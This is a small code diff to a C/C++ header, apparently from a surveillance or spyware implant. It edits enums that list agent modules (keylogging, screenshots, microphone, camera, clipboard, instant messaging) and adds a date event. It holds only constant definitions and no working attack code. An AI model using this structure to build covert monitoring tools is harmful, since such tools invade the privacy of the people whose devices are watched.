@@ -47,7 +47,7 @@ enum TAgentType
 	EAgent_Keylog = 0x1008,
 	EAgent_Snapshot = 0x1009,				// ***
 	EAgent_URL_TODO,
-	//EAgent_IM_TODO,
+	EAgent_IM_TODO = 0x100b,
 	EAgent_Mic = 0x100D,					// ***
 	EAgent_Cam,								// ***
 	EAgent_Clipboard_TODO,
@@ -74,6 +74,7 @@ enum TEventType
 	EEvent_AC,						// ***
 	EEvent_Battery,					// ***
 	EEvent_Standby,					// ***
+	EEvent_Date,					// 8.0
 	EEvent_LAST_ID
 	};
 
